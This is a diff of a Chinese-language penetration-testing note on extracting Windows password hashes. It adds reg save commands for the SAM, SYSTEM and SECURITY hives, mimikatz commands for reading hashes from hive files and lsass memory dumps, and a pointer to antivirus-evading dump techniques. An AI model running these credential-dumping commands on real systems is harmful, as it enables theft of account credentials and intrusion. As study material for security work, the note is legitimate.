@@ -8,14 +8,14 @@
 
 [Windows下的密码hash——NTLM hash和Net-NTLM hash介绍](https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D)
 ## 0x01 离线获取Hash
-
-### 1.目标主机注册表导出文件
+### 1. 导出SAM和SYSTEM表方法
+#### （1）目标主机注册表导出文件
 ```
 reg save HKLM\SYSTEM system.hive
 reg save HKLM\SAM sam.hive
 reg save hklm\security security.hive
 ```
-### 2. 通过mimikatz导出Hash
+#### （2）通过mimikatz导出Hash
 
 ```
 $ ./mimikatz.exe
@@ -28,6 +28,18 @@ $ ./mimikatz.exe
   '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
 
 mimikatz # lsadump::sam /sam:sam.hive /system:system.hive
+```
+### 2. 导出lsass进程内存方法
+
+#### （1）目标主机lsass.exe dump内存
+
+[内网渗透-免杀抓取windows hash](https://www.freebuf.com/column/231880.html)介绍了一些方法，主要是为了过杀软，如果能登录3389可以直接用任务管理器右键导出lsass.exe的内存。
+
+#### （2）通过mimikatz导出Hash
+```
+$ ./mimikatz.exe
+mimikatz# sekurlsa::minidump 1.bin
+mimikatz# sekurlsa::loginpasswords full
 ```
 
 ### 3. 导出域Hash ntds,dit
@@ -91,3 +103,4 @@ mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" "exi
 
 - https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D 
 - https://uknowsec.cn/posts/notes/Mimikatz%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96.html
+- [内网渗透-免杀抓取windows hash](https://www.freebuf.com/column/231880.html)
